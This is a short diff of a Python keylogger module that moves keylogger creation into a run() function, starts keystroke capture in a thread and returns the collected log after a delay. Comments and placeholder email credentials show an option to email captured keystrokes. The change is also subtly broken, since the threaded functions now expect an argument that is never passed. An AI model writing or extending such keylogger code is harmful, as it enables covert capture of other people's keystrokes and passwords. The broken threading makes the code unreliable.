@@ -16,19 +16,21 @@ EMAIL_ADDRESS = "email@provider.tld"
 EMAIL_PASSWORD = "password_here"
 
 def run(**args):
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     
-    def func1():
-        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    def func1(keylogger):
     # if you want a keylogger to send to your email
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want a keylogger to record keylogs to a local file 
     # (and then send it using your favorite method)
         keylogger.start()
-    def func2():
-        print("Working")
+    
+    def func2(keylogger):
+        time.sleep(60)
+        return keylogger.log
     
     Thread(target = func1).start()
-    Thread(target = func2).start()
+    return Thread(target = func2).start()
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
